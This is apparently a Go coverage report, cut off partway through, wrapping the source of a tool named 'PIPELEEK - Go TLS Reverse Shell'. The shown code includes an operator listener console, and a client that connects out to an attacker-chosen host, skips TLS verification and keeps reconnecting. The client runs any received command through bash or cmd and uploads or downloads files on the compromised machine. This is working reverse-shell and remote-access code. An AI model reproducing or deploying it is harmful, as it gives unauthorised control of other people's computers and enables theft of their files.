
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<title>gotsl: Go Coverage Report</title>
		<style>
			body {
				background: black;
				color: rgb(80, 80, 80);
			}
			body, pre, #legend span {
				font-family: Menlo, monospace;
				font-weight: bold;
			}
			#topbar {
				background: black;
				position: fixed;
				top: 0; left: 0; right: 0;
				height: 42px;
				border-bottom: 1px solid rgb(80, 80, 80);
			}
			#content {
				margin-top: 50px;
			}
			#nav, #legend {
				float: left;
				margin-left: 10px;
			}
			#legend {
				margin-top: 12px;
			}
			#nav {
				margin-top: 10px;
			}
			#legend span {
				margin: 0 5px;
			}
			.cov0 { color: rgb(192, 0, 0) }
.cov1 { color: rgb(128, 128, 128) }
.cov2 { color: rgb(116, 140, 131) }
.cov3 { color: rgb(104, 152, 134) }
.cov4 { color: rgb(92, 164, 137) }
.cov5 { color: rgb(80, 176, 140) }
.cov6 { color: rgb(68, 188, 143) }
.cov7 { color: rgb(56, 200, 146) }
.cov8 { color: rgb(44, 212, 149) }
.cov9 { color: rgb(32, 224, 152) }
.cov10 { color: rgb(20, 236, 155) }

		</style>
	</head>
	<body>
		<div id="topbar">
			<div id="nav">
				<select id="files">
				
				<option value="file0">golang-https-rev/cmd/gotsl/main.go (6.4%)</option>
				
				<option value="file1">golang-https-rev/cmd/gotsr/main.go (24.1%)</option>
				
				<option value="file2">golang-https-rev/pkg/certs/certs.go (77.8%)</option>
				
				<option value="file3">golang-https-rev/pkg/client/command_handlers.go (66.3%)</option>
				
				<option value="file4">golang-https-rev/pkg/client/reverse.go (42.3%)</option>
				
				<option value="file5">golang-https-rev/pkg/compression/compression.go (83.3%)</option>
				
				<option value="file6">golang-https-rev/pkg/server/listener.go (82.7%)</option>
				
				</select>
			</div>
			<div id="legend">
				<span>not tracked</span>
			
				<span class="cov0">not covered</span>
				<span class="cov8">covered</span>
			
			</div>
		</div>
		<div id="content">
		
		<pre class="file" id="file0" style="display: none">package main

import (
        "crypto/tls"
        "fmt"
        "log"
        "os"
        "strings"
        "time"

        "github.com/peterh/liner"

        "golang-https-rev/pkg/certs"
        "golang-https-rev/pkg/compression"
        "golang-https-rev/pkg/protocol"
        "golang-https-rev/pkg/server"
        "golang-https-rev/pkg/version"
)

func printHeader() <span class="cov8" title="1">{
        fmt.Println()
        fmt.Println("  ██████╗  ██████╗ ████████╗███████╗")
        fmt.Println("  ██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝")
        fmt.Println("  ██║  ███╗██║   ██║   ██║   ███████╗")
        fmt.Println("  ██║   ██║██║   ██║   ██║   ╚════██║")
        fmt.Println("  ╚██████╔╝╚██████╔╝   ██║   ███████║")
        fmt.Println("   ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝")
        fmt.Println()
        fmt.Println("  PIPELEEK - Go TLS Reverse Shell")
        fmt.Println()
}</span>

func main() <span class="cov0" title="0">{
        if err := runListener(os.Args[1:]); err != nil </span><span class="cov0" title="0">{
                log.Fatal(err)
        }</span>
}

func runListener(args []string) error <span class="cov8" title="1">{
        printHeader()

        if len(args) != 2 </span><span class="cov8" title="1">{
                return fmt.Errorf("Usage: gotsl &lt;port&gt; &lt;network-interface&gt;")
        }</span>

        <span class="cov0" title="0">port := args[0]
        networkInterface := args[1]

        log.Println("Generating self-signed certificate...")
        cert, err := certs.GenerateSelfSignedCert()
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to generate certificate: %w", err)
        }</span>
        <span class="cov0" title="0">log.Println("Certificate generated successfully")

        log.Printf("Version: %s (commit %s, date %s)", version.Version, version.Commit, version.Date)

        // Create TLS config
        tlsConfig := &amp;tls.Config{
                Certificates: []tls.Certificate{cert},
                MinVersion:   tls.VersionTLS12,
        }

        // Create listener
        listener := server.NewListener(port, networkInterface, tlsConfig)
        netListener, err := listener.Start()
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to start listener: %w", err)
        }</span>
        <span class="cov0" title="0">defer netListener.Close()

        log.Println("Listener ready. Waiting for connections...")
        interactiveShell(listener)
        return nil</span>
}

func interactiveShell(l *server.Listener) <span class="cov0" title="0">{
        line := liner.NewLiner()
        line.SetCtrlCAborts(true)
        defer line.Close()

        var currentClient string

        fmt.Println("\nCommands:")
        fmt.Println("  ls                   - List connected clients")
        fmt.Println("  use &lt;client_id&gt;      - Interact with a specific client")
        fmt.Println("  upload &lt;l&gt; &lt;r&gt;       - Upload local file &lt;l&gt; to remote path &lt;r&gt; (active session)")
        fmt.Println("  download &lt;r&gt; &lt;l&gt;     - Download remote file &lt;r&gt; to local path &lt;l&gt; (active session)")
        fmt.Println("  bg                   - Return to listener prompt from a session")
        fmt.Println("  exit                 - Exit the listener")
        fmt.Println()

        for </span><span class="cov0" title="0">{
                prompt := "listener&gt; "
                if currentClient != "" </span><span class="cov0" title="0">{
                        prompt = fmt.Sprintf("shell[%s]&gt; ", currentClient)
                }</span>

                <span class="cov0" title="0">input, err := line.Prompt(prompt)
                if err != nil </span><span class="cov0" title="0">{
                        if err == liner.ErrPromptAborted </span><span class="cov0" title="0">{
                                fmt.Println()
                                continue</span>
                        }
                        <span class="cov0" title="0">return</span>
                }

                <span class="cov0" title="0">input = strings.TrimSpace(input)
                if input == "" </span><span class="cov0" title="0">{
                        continue</span>
                }
                <span class="cov0" title="0">line.AppendHistory(input)

                parts := strings.Fields(input)
                command := parts[0]

                if currentClient == "" </span><span class="cov0" title="0">{
                        switch command </span>{
                        case "ls", "dir":<span class="cov0" title="0">
                                clients := l.GetClients()
                                if len(clients) == 0 </span><span class="cov0" title="0">{
                                        fmt.Println("No clients connected")
                                }</span> else<span class="cov0" title="0"> {
                                        fmt.Println("\nConnected Clients:")
                                        for i, addr := range clients </span><span class="cov0" title="0">{
                                                fmt.Printf("  %d. %s\n", i+1, addr)
                                        }</span>
                                        <span class="cov0" title="0">fmt.Println()</span>
                                }

                        case "use":<span class="cov0" title="0">
                                if len(parts) &lt; 2 </span><span class="cov0" title="0">{
                                        fmt.Println("Usage: use &lt;client_id&gt;")
                                        continue</span>
                                }

                                <span class="cov0" title="0">var numIdx int
                                if _, err := fmt.Sscanf(parts[1], "%d", &amp;numIdx); err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Invalid client ID: %s\n", parts[1])
                                        continue</span>
                                }

                                <span class="cov0" title="0">clients := l.GetClients()
                                if numIdx &gt; 0 &amp;&amp; numIdx &lt;= len(clients) </span><span class="cov0" title="0">{
                                        currentClient = clients[numIdx-1]
                                        fmt.Printf("Now interacting with: %s\n", currentClient)
                                        fmt.Println("Type 'bg' to return to listener prompt")
                                }</span> else<span class="cov0" title="0"> {
                                        fmt.Println("Client not found")
                                }</span>

                        case "exit":<span class="cov0" title="0">
                                return</span>

                        default:<span class="cov0" title="0">
                                fmt.Printf("Unknown command: %s\n", command)</span>
                        }
                } else<span class="cov0" title="0"> {
                        if input == "bg" </span><span class="cov0" title="0">{
                                fmt.Printf("Backgrounding session with %s\n", currentClient)
                                currentClient = ""
                                continue</span>
                        }

                        // handle file transfer helpers
                        <span class="cov0" title="0">if strings.HasPrefix(input, "upload ") </span><span class="cov0" title="0">{
                                parts := strings.Fields(input)
                                if len(parts) != 3 </span><span class="cov0" title="0">{
                                        fmt.Println("Usage: upload &lt;local_path&gt; &lt;remote_path&gt;")
                                        continue</span>
                                }
                                <span class="cov0" title="0">localPath, remotePath := parts[1], parts[2]
                                data, err := os.ReadFile(localPath)
                                if err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error reading local file: %v\n", err)
                                        continue</span>
                                }
                                <span class="cov0" title="0">compressed, err := compression.CompressToHex(data)
                                if err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error compressing file: %v\n", err)
                                        continue</span>
                                }

                                // Send file in chunks to avoid exceeding buffer limits on Windows
                                <span class="cov0" title="0">totalSize := len(compressed)

                                startCmd := fmt.Sprintf("%s %s %d", protocol.CmdStartUpload, remotePath, totalSize)
                                if err := l.SendCommand(currentClient, startCmd); err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error starting upload: %v\n", err)
                                        currentClient = ""
                                        continue</span>
                                }
                                <span class="cov0" title="0">resp, err := l.GetResponse(currentClient, 30*time.Second)
                                if err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error getting start upload response: %v\n", err)
                                        currentClient = ""
                                        continue</span>
                                }
                                <span class="cov0" title="0">if !strings.Contains(resp, "OK") </span><span class="cov0" title="0">{
                                        fmt.Printf("Error starting upload: unexpected response: %s\n", strings.TrimSpace(strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")))
                                        currentClient = ""
                                        continue</span>
                                }

                                // Send chunks
                        <span class="cov0" title="0">chunkNum := 0
                        for i := 0; i &lt; totalSize; i += protocol.ChunkSize </span><span class="cov0" title="0">{
                                end := i + protocol.ChunkSize
                                if end &gt; totalSize </span><span class="cov0" title="0">{
                                        end = totalSize
                                }</span>
                                <span class="cov0" title="0">chunk := compressed[i:end]
                                chunkNum++
                                chunkCmd := fmt.Sprintf("%s %s", protocol.CmdUploadChunk, chunk)
                                if err := l.SendCommand(currentClient, chunkCmd); err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error sending upload chunk: %v\n", err)
                                        currentClient = ""
                                        break</span>
                                }
                                <span class="cov0" title="0">resp, err := l.GetResponse(currentClient, 30*time.Second)
                                if err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error getting chunk response: %v\n", err)
                                        currentClient = ""
                                        break</span>
                                }
                                <span class="cov0" title="0">if !strings.Contains(resp, "OK") </span><span class="cov0" title="0">{
                                        cleanResp := strings.TrimSpace(strings.ReplaceAll(resp, protocol.EndOfOutputMarker, ""))
                                        fmt.Printf("Chunk upload error: %s\n", cleanResp)
                                        currentClient = ""
                                        break</span>
                                }
                                <span class="cov0" title="0">fmt.Printf("Uploaded chunk %d: %d bytes\n", chunkNum, len(chunk))</span>
                        }

                        <span class="cov0" title="0">if currentClient == "" </span><span class="cov0" title="0">{
                                continue</span>
                        }

                                <span class="cov0" title="0">endCmd := fmt.Sprintf("%s %s", protocol.CmdEndUpload, remotePath)
                                if err := l.SendCommand(currentClient, endCmd); err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error ending upload: %v\n", err)
                                        currentClient = ""
                                        continue</span>
                                }
                                <span class="cov0" title="0">resp, err = l.GetResponse(currentClient, 30*time.Second)
                                if err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error getting upload response: %v\n", err)
                                        currentClient = ""
                                        continue</span>
                                }
                                <span class="cov0" title="0">clean := strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")
                                fmt.Print(clean)
                                if !strings.HasSuffix(clean, "\n") </span><span class="cov0" title="0">{
                                        fmt.Println()
                                }</span>
                                <span class="cov0" title="0">fmt.Printf("Total uploaded: %d bytes (original), %d bytes (compressed)\n", len(data), totalSize)
                                continue</span>
                        }

                        <span class="cov0" title="0">if strings.HasPrefix(input, "download ") </span><span class="cov0" title="0">{
                                parts := strings.Fields(input)
                                if len(parts) != 3 </span><span class="cov0" title="0">{
                                        fmt.Println("Usage: download &lt;remote_path&gt; &lt;local_path&gt;")
                                        continue</span>
                                }
                                <span class="cov0" title="0">remotePath, localPath := parts[1], parts[2]
                                cmd := fmt.Sprintf("%s %s", protocol.CmdDownload, remotePath)
                                if err := l.SendCommand(currentClient, cmd); err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error sending download: %v\n", err)
                                        currentClient = ""
                                        continue</span>
                                }
                                <span class="cov0" title="0">resp, err := l.GetResponse(currentClient, 5000000000)
                                if err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error getting download response: %v\n", err)
                                        currentClient = ""
                                        continue</span>
                                }
                                <span class="cov0" title="0">clean := strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")
                                clean = strings.TrimSpace(clean)
                                if !strings.HasPrefix(clean, protocol.DataPrefix) </span><span class="cov0" title="0">{
                                        fmt.Printf("Unexpected download response (length %d bytes)\n", len(clean))
                                        continue</span>
                                }
                                <span class="cov0" title="0">payload := strings.TrimPrefix(clean, protocol.DataPrefix)
                                decoded, err := compression.DecompressHex(payload)
                                if err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error decoding payload: %v\n", err)
                                        continue</span>
                                }
                                <span class="cov0" title="0">if err := os.WriteFile(localPath, decoded, 0644); err != nil </span><span class="cov0" title="0">{
                                        fmt.Printf("Error writing local file: %v\n", err)
                                        continue</span>
                                }
                                <span class="cov0" title="0">fmt.Printf("Downloaded %d bytes to %s\n", len(decoded), localPath)
                                continue</span>
                        }

                        <span class="cov0" title="0">if err := l.SendCommand(currentClient, input); err != nil </span><span class="cov0" title="0">{
                                fmt.Printf("Error sending command: %v\n", err)
                                currentClient = ""
                                continue</span>
                        }

                        <span class="cov0" title="0">resp, err := l.GetResponse(currentClient, 5000000000) // 5 seconds
                        if err != nil </span><span class="cov0" title="0">{
                                fmt.Printf("Error getting response: %v\n", err)
                                currentClient = ""
                                continue</span>
                        }

                        <span class="cov0" title="0">clean := strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")
                        fmt.Print(clean)
                        if !strings.HasSuffix(clean, "\n") </span><span class="cov0" title="0">{
                                fmt.Println()
                        }</span>
                }
        }
}
</pre>
		
		<pre class="file" id="file1" style="display: none">package main

import (
        "fmt"
        "log"
        "os"
        "time"

        "golang-https-rev/pkg/client"
        "golang-https-rev/pkg/version"
)

func printHeader() <span class="cov8" title="1">{
        fmt.Println()
        fmt.Println("  ██████╗  ██████╗ ████████╗███████╗")
        fmt.Println("  ██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝")
        fmt.Println("  ██║  ███╗██║   ██║   ██║   ███████╗")
        fmt.Println("  ██║   ██║██║   ██║   ██║   ╚════██║")
        fmt.Println("  ╚██████╔╝╚██████╔╝   ██║   ███████║")
        fmt.Println("   ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝")
        fmt.Println()
        fmt.Println("  PIPELEEK - Go TLS Reverse Shell")
        fmt.Println()
}</span>

func main() <span class="cov0" title="0">{
        if err := runClient(os.Args[1:]); err != nil </span><span class="cov0" title="0">{
                log.Fatal(err)
        }</span>
}

func runClient(args []string) error <span class="cov8" title="1">{
        printHeader()

        if len(args) != 2 </span><span class="cov8" title="1">{
                return fmt.Errorf("Usage: gotsr &lt;host:port|domain:port&gt; &lt;max-retries&gt;")
        }</span>

        <span class="cov0" title="0">target := args[0]
        maxRetries := 0
        fmt.Sscanf(args[1], "%d", &amp;maxRetries)

        log.Printf("Starting GOTS - PIPELEEK client...")
        log.Printf("Version: %s (commit %s, date %s)", version.Version, version.Commit, version.Date)
        log.Printf("Target: %s", target)
        log.Printf("Max retries: %d (0 = infinite)", maxRetries)

        connectWithRetry(target, maxRetries)
        return nil</span>
}

func connectWithRetry(target string, maxRetries int) <span class="cov0" title="0">{
        retries := 0
        backoff := 5 * time.Second

        for </span><span class="cov0" title="0">{
                cl := client.NewReverseClient(target)
                if err := cl.Connect(); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Connection failed: %v", err)

                        if maxRetries &gt; 0 </span><span class="cov0" title="0">{
                                retries++
                                if retries &gt;= maxRetries </span><span class="cov0" title="0">{
                                        log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
                                        return
                                }</span>
                        }

                        <span class="cov0" title="0">log.Printf("Retrying in %v... (attempt %d)", backoff, retries+1)
                        time.Sleep(backoff)
                        backoff *= 2
                        if backoff &gt; 5*time.Minute </span><span class="cov0" title="0">{
                                backoff = 5 * time.Minute
                        }</span>
                        <span class="cov0" title="0">continue</span>
                }

                <span class="cov0" title="0">if err := cl.HandleCommands(); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Connection failed: %v", err)
                        cl.Close()

                        if maxRetries &gt; 0 </span><span class="cov0" title="0">{
                                retries++
                                if retries &gt;= maxRetries </span><span class="cov0" title="0">{
                                        log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
                                        return
                                }</span>
                        }

                        <span class="cov0" title="0">log.Printf("Reconnecting in %v... (attempt %d)", backoff, retries+1)
                        time.Sleep(backoff)
                        backoff *= 2
                        if backoff &gt; 5*time.Minute </span><span class="cov0" title="0">{
                                backoff = 5 * time.Minute
                        }</span>
                }
        }
}
</pre>
		
		<pre class="file" id="file2" style="display: none">package certs

import (
        "crypto/rand"
        "crypto/rsa"
        "crypto/tls"
        "crypto/x509"
        "crypto/x509/pkix"
        "encoding/pem"
        "fmt"
        "math/big"
        "time"
)

// GenerateSelfSignedCert creates a self-signed TLS certificate on the fly
func GenerateSelfSignedCert() (tls.Certificate, error) <span class="cov8" title="1">{
        privateKey, err := rsa.GenerateKey(rand.Reader, 4096)
        if err != nil </span><span class="cov0" title="0">{
                return tls.Certificate{}, fmt.Errorf("failed to generate private key: %v", err)
        }</span>

        <span class="cov8" title="1">notBefore := time.Now()
        notAfter := notBefore.Add(365 * 24 * time.Hour)

        serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
        if err != nil </span><span class="cov0" title="0">{
                return tls.Certificate{}, fmt.Errorf("failed to generate serial number: %v", err)
        }</span>

        <span class="cov8" title="1">template := x509.Certificate{
                SerialNumber: serialNumber,
                Subject: pkix.Name{
                        Organization: []string{"Reverse Shell Listener"},
                        CommonName:   "localhost",
                },
                NotBefore:             notBefore,
                NotAfter:              notAfter,
                KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
                ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
                BasicConstraintsValid: true,
        }

        certDER, err := x509.CreateCertificate(rand.Reader, &amp;template, &amp;template, &amp;privateKey.PublicKey, privateKey)
        if err != nil </span><span class="cov0" title="0">{
                return tls.Certificate{}, fmt.Errorf("failed to create certificate: %v", err)
        }</span>

        <span class="cov8" title="1">certPEM := pem.EncodeToMemory(&amp;pem.Block{Type: "CERTIFICATE", Bytes: certDER})
        keyPEM := pem.EncodeToMemory(&amp;pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})

        cert, err := tls.X509KeyPair(certPEM, keyPEM)
        if err != nil </span><span class="cov0" title="0">{
                return tls.Certificate{}, fmt.Errorf("failed to load certificate: %v", err)
        }</span>

        <span class="cov8" title="1">return cert, nil</span>
}
</pre>
		
		<pre class="file" id="file3" style="display: none">package client

import (
        "fmt"
        "log"
        "os"
        "os/exec"
        "runtime"
        "strings"

        "golang-https-rev/pkg/compression"
        "golang-https-rev/pkg/protocol"
)

// handlePingCommand handles PING requests from the server
func (rc *ReverseClient) handlePingCommand() error <span class="cov8" title="1">{
        rc.writer.WriteString(protocol.CmdPong + "\n" + protocol.EndOfOutputMarker + "\n")
        return rc.writer.Flush()
}</span>

// handleStartUploadCommand handles the START_UPLOAD command to prepare for file upload
func (rc *ReverseClient) handleStartUploadCommand(command string) error <span class="cov8" title="1">{
        parts := strings.SplitN(command, " ", 3)
        if len(parts) != 3 </span><span class="cov8" title="1">{
                rc.writer.WriteString("Invalid start_upload command\n" + protocol.EndOfOutputMarker + "\n")
                rc.writer.Flush()
                return fmt.Errorf("invalid start_upload command: %s", command)
        }</span>
        <span class="cov8" title="1">remotePath := parts[1]
        rc.currentUploadPath = remotePath
        rc.uploadChunks = []string{}
        rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
        return rc.writer.Flush()</span>
}

// handleUploadChunkCommand handles receiving and storing a single file chunk
func (rc *ReverseClient) handleUploadChunkCommand(command string) error <span class="cov8" title="1">{
        if rc.currentUploadPath == "" </span><span class="cov8" title="1">{
                rc.writer.WriteString("No active upload\n" + protocol.EndOfOutputMarker + "\n")
                rc.writer.Flush()
                return fmt.Errorf("no active upload session")
        }</span>
        <span class="cov8" title="1">chunk := strings.TrimPrefix(command, protocol.CmdUploadChunk+" ")
        rc.uploadChunks = append(rc.uploadChunks, chunk)
        rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
        return rc.writer.Flush()</span>
}

// handleEndUploadCommand handles finalizing a file upload and writing to disk
func (rc *ReverseClient) handleEndUploadCommand(command string) error <span class="cov8" title="1">{
        parts := strings.SplitN(command, " ", 2)
        if len(parts) != 2 </span><span class="cov8" title="1">{
                rc.writer.WriteString("Invalid end_upload command\n" + protocol.EndOfOutputMarker + "\n")
                rc.writer.Flush()
                return fmt.Errorf("invalid end_upload command: %s", command)
        }</span>

        <span class="cov0" title="0">if rc.currentUploadPath == "" </span><span class="cov0" title="0">{
                rc.writer.WriteString("No active upload\n" + protocol.EndOfOutputMarker + "\n")
                rc.writer.Flush()
                return fmt.Errorf("no active upload session")
        }</span>

        // Decompress and write chunks to file
        <span class="cov0" title="0">decompressedData := []byte{}
        for _, chunk := range rc.uploadChunks </span><span class="cov0" title="0">{
                decompressed, err := compression.DecompressHex(chunk)
                if err != nil </span><span class="cov0" title="0">{
                        rc.writer.WriteString(fmt.Sprintf("Decompression error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
                        rc.writer.Flush()
                        return fmt.Errorf("decompression failed: %w", err)
                }</span>
                <span class="cov0" title="0">decompressedData = append(decompressedData, decompressed...)</span>
        }

        // Write to file
        <span class="cov0" title="0">err := os.WriteFile(rc.currentUploadPath, decompressedData, 0644)
        if err != nil </span><span class="cov0" title="0">{
                rc.writer.WriteString(fmt.Sprintf("Write error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
                rc.writer.Flush()
                return fmt.Errorf("failed to write file: %w", err)
        }</span>

        <span class="cov0" title="0">totalBytes := len(decompressedData)
        rc.writer.WriteString(fmt.Sprintf("OK\n%d\n", totalBytes) + protocol.EndOfOutputMarker + "\n")
        rc.writer.Flush()

        // Cleanup
        rc.currentUploadPath = ""
        rc.uploadChunks = []string{}
        return nil</span>
}

// handleDownloadCommand handles file download requests
func (rc *ReverseClient) handleDownloadCommand(command string) error <span class="cov8" title="1">{
        parts := strings.SplitN(command, " ", 2)
        if len(parts) != 2 </span><span class="cov8" title="1">{
                rc.writer.WriteString("Invalid download command\n" + protocol.EndOfOutputMarker + "\n")
                rc.writer.Flush()
                return fmt.Errorf("invalid download command: %s", command)
        }</span>

        <span class="cov8" title="1">filePath := parts[1]
        data, err := os.ReadFile(filePath)
        if err != nil </span><span class="cov8" title="1">{
                rc.writer.WriteString(fmt.Sprintf("Error reading file: %v\n", err) + protocol.EndOfOutputMarker + "\n")
                rc.writer.Flush()
                return fmt.Errorf("failed to read file: %w", err)
        }</span>

        // Compress data
        <span class="cov8" title="1">compressed, err := compression.CompressToHex(data)
        if err != nil </span><span class="cov0" title="0">{
                rc.writer.WriteString(fmt.Sprintf("Compression error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
                rc.writer.Flush()
                return fmt.Errorf("compression failed: %w", err)
        }</span>

        <span class="cov8" title="1">rc.writer.WriteString(compressed + "\n" + protocol.EndOfOutputMarker + "\n")
        return rc.writer.Flush()</span>
}

// handleExitCommand handles the EXIT command to gracefully close connection
func (rc *ReverseClient) handleExitCommand() error <span class="cov8" title="1">{
        return nil // Signal to return from main loop
}</span>

// handleShellCommand executes a shell command and returns output
func (rc *ReverseClient) handleShellCommand(command string) error <span class="cov8" title="1">{
        var cmd *exec.Cmd

        if runtime.GOOS == "windows" </span><span class="cov0" title="0">{
                cmd = exec.Command("cmd", "/C", command)
        }</span> else<span class="cov8" title="1"> {
                cmd = exec.Command("bash", "-c", command)
        }</span>

        <span class="cov8" title="1">output, err := cmd.CombinedOutput()
        if err != nil </span><span class="cov8" title="1">{
                // Log error but send output anyway
                log.Printf("Command execution error: %v", err)
        }</span>

        <span class="cov8" title="1">rc.writer.WriteString(string(output) + protocol.EndOfOutputMarker + "\n")
        return rc.writer.Flush()</span>
}

// processCommand processes a single command and returns whether to continue
func (rc *ReverseClient) processCommand(command string) (shouldContinue bool, err error) <span class="cov8" title="1">{
        // Handle keepalive ping
        if command == protocol.CmdPing </span><span class="cov8" title="1">{
                return true, rc.handlePingCommand()
        }</span>

        // Log command but avoid logging data payloads for upload chunks
        <span class="cov8" title="1">if strings.HasPrefix(command, protocol.CmdUploadChunk+" ") </span><span class="cov0" title="0">{
                log.Printf("Received command: %s &lt;data&gt;", protocol.CmdUploadChunk)
        }</span> else<span class="cov8" title="1"> {
                log.Printf("Received command: %s", command)
        }</span>

        <span class="cov8" title="1">if command == protocol.CmdExit </span><span class="cov8" title="1">{
                return false, rc.handleExitCommand()
        }</span>

        // Handle file transfers
        <span class="cov8" title="1">if strings.HasPrefix(command, protocol.CmdStartUpload+" ") </span><span class="cov8" title="1">{
                return true, rc.handleStartUploadCommand(command)
        }</span>

        <span class="cov8" title="1">if strings.HasPrefix(command, protocol.CmdUploadChunk+" ") </span><span class="cov0" title="0">{
                return true, rc.handleUploadChunkCommand(command)
        }</span>

        <span class="cov8" title="1">if strings.HasPrefix(command, protocol.CmdEndUpload+" ") </span><span class="cov0" title="0">{
                return true, rc.handleEndUploadCommand(command)
        }</span>

        <span class="cov8" title="1">if strings.HasPrefix(command, protocol.CmdDownload+" ") </span><span class="cov0" title="0">{
                return true, rc.handleDownloadCommand(command)
        }</span>

        // Default: execute as shell command
        <span class="cov8" title="1">return true, rc.handleShellCommand(command)</span>
}
</pre>
		
		<pre class="file" id="file4" style="display: none">package client

import (
"bufio"
"crypto/tls"
"errors"
"fmt"
"io"
"log"
"os/exec"
"runtime"
"strings"
"time"

"golang-https-rev/pkg/protocol"
)

// ReverseClient represents a reverse shell client that connects to a listener
// and handles command execution and file transfers.
type ReverseClient struct {
target            string
conn              *tls.Conn
reader            *bufio.Reader
writer            *bufio.Writer
isConnected       bool
currentUploadPath string
uploadChunks      []string
}

// NewReverseClient creates a new reverse shell client
func NewReverseClient(target string) *ReverseClient <span class="cov8" title="1">{
return &amp;ReverseClient{target: target}
}</span>

// Connect establishes a TLS connection to the listener
func (rc *ReverseClient) Connect() error <span class="cov8" title="1">{
conn, err := tls.Dial("tcp", rc.target, &amp;tls.Config{
InsecureSkipVerify: true,
})
if err != nil </span><span class="cov8" title="1">{
return fmt.Errorf("connection failed: %w", err)
}</span>

<span class="cov8" title="1">rc.conn = conn
rc.reader = bufio.NewReader(conn)
rc.writer = bufio.NewWriter(conn)
rc.isConnected = true
return nil</span>
}

// IsConnected returns whether the client is currently connected
func (rc *ReverseClient) IsConnected() bool <span class="cov8" title="1">{
return rc.isConnected
}</span>

// Close closes the connection
func (rc *ReverseClient) Close() error <span class="cov8" title="1">{
if rc.conn == nil </span><span class="cov0" title="0">{
return nil
}</span>
<span class="cov8" title="1">rc.isConnected = false
return rc.conn.Close()</span>
}

// ExecuteCommand executes a shell command and returns the output
func (rc *ReverseClient) ExecuteCommand(command string) string <span class="cov8" title="1">{
output, err := executeShellCommand(command)
if err != nil </span><span class="cov0" title="0">{
return fmt.Sprintf("Error: %v\n", err)
}</span>
<span class="cov8" title="1">return output</span>
}

// executeShellCommand executes a shell command and returns the output
func executeShellCommand(command string) (string, error) <span class="cov8" title="1">{
var cmd *exec.Cmd

if runtime.GOOS == "windows" </span><span class="cov0" title="0">{
cmd = exec.Command("cmd", "/C", command)
}</span> else<span class="cov8" title="1"> {
cmd = exec.Command("/bin/sh", "-c", command)
}</span>

<span class="cov8" title="1">output, err := cmd.CombinedOutput()
if err != nil </span><span class="cov0" title="0">{
return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output)), err
}</span>
<span class="cov8" title="1">return string(output), nil</span>
}

// HandleCommands listens for commands and executes them
func (rc *ReverseClient) HandleCommands() error <span class="cov0" title="0">{
var cmdBuffer strings.Builder

for </span><span class="cov0" title="0">{
// Set read deadline to allow graceful shutdown
rc.conn.SetReadDeadline(time.Now().Add(protocol.ReadTimeout * time.Second))
line, err := rc.reader.ReadString('\n')
rc.conn.SetReadDeadline(time.Time{})

cmdBuffer.WriteString(line)

if errors.Is(err, bufio.ErrBufferFull) </span><span class="cov0" title="0">{
// Command line exceeded buffer; keep accumulating until newline
if cmdBuffer.Len() &gt; protocol.MaxBufferSize </span><span class="cov0" title="0">{
cmdBuffer.Reset()
}</span>
<span class="cov0" title="0">continue</span>
}

<span class="cov0" title="0">if err != nil </span><span class="cov0" title="0">{
if err == io.EOF </span><span class="cov0" title="0">{
return nil
}</span>
<span class="cov0" title="0">if netErr, ok := err.(interface{ Timeout() bool }); ok &amp;&amp; netErr.Timeout() </span><span class="cov0" title="0">{
continue</span>
}
<span class="cov0" title="0">return fmt.Errorf("read error: %w", err)</span>
}

<span class="cov0" title="0">command := strings.TrimSpace(cmdBuffer.String())
cmdBuffer.Reset()
if command == "" </span><span class="cov0" title="0">{
continue</span>
}

// Process command using extracted handler
<span class="cov0" title="0">shouldContinue, err := rc.processCommand(command)
if err != nil </span><span class="cov0" title="0">{
log.Printf("Error processing command: %v", err)
continue</span>
}
<span class="cov0" title="0">if !shouldContinue </span><span class="cov0" title="0">{
return nil
}</span>
}
}
</pre>
		
		<pre class="file" id="file5" style="display: none">// Package compression provides utilities for compressing and decompressing data
// using gzip and hex encoding for protocol transmission.
package compression

import (
        "bytes"
        "compress/gzip"
        "encoding/hex"
        "fmt"
        "io"
)

// CompressToHex compresses data using gzip and returns it as a hex-encoded string.
// This is useful for transmitting binary data over text-based protocols.
func CompressToHex(data []byte) (string, error) <span class="cov8" title="1">{
        var buf bytes.Buffer
        gz := gzip.NewWriter(&amp;buf)
        if _, err := gz.Write(data); err != nil </span><span class="cov0" title="0">{
                return "", fmt.Errorf("failed to write to gzip: %w", err)
        }</span>
        <span class="cov8" title="1">if err := gz.Close(); err != nil </span><span class="cov0" title="0">{
